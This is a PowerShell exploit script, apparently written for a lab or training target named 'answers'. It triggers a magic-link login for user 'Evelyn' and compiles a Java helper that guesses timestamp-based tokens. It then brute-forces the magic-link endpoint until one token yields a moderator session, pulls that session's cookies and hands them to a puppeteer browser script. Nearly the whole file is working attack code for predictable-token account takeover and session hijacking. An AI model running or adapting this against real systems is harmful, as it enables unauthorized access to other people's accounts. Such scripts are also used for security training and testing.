# node setup
if (!(Test-Path -Path 'package.json' -PathType Leaf)) {
    npm init -y
    # I usually run vagrant from a windows host, npm tries to create symbolic links which on NTFS file systems requires a high integrity level process e.g run as administrator -> uac. I not doing that so --no-bin-links fixes this. See https://github.com/laravel/homestead/issues/611
    npm install puppeteer --no-bin-links
}
$user = 'Evelyn'
$start = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds() #date +%s%3N
Invoke-WebRequest -Uri 'http://answers/generateMagicLink' -Method POST -Body "username=$user" -SkipHttpErrorCheck -MaximumRedirection 0  -ea SilentlyContinue
$end =   [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds() #date +%s%3N
write-host 'Date Range: ' $start $end
javac AnswersResetToken.java
java AnswersResetToken $start $end > tokens.txt
$tokens = Get-Content tokens.txt
$tokens | ForEach-Object -Process {
    $link = 'http://answers/magicLink/' + $_
    $result = Invoke-WebRequest -uri $link -SkipHttpErrorCheck -MaximumRedirection 1 -SessionVariable 'Session' -ea SilentlyContinue
    if ($result.RawContent -like '*moderate*') {
        $link
        $result
        #$Session.Cookies.GetCookies($link)
        $Session.Cookies.GetCookies($link).Name
        $Session.Cookies.GetCookies($link).Value
        node browser.js 'http://answers/' $Session.Cookies.GetCookies($link).Name $Session.Cookies.GetCookies($link).Value
        break
    }
    
}
Remove-Item tokens.txt
Remove-Item *.class

